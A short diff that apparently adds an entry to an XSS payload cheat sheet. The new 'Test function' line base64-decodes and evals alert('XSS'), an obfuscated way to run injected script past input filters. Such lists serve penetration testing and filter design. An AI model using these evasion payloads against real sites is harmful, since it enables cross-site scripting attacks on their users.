@@ -309,6 +309,7 @@ https://www.hahwul.com/2020/10/03/forcing-http-redirect-xss/
 
 ### Test function 
 ```js
+["YWxlcnQoJ1hTUycp"].map(atob).map(eval)
 console.trace()
 console.error()
 console.trace``
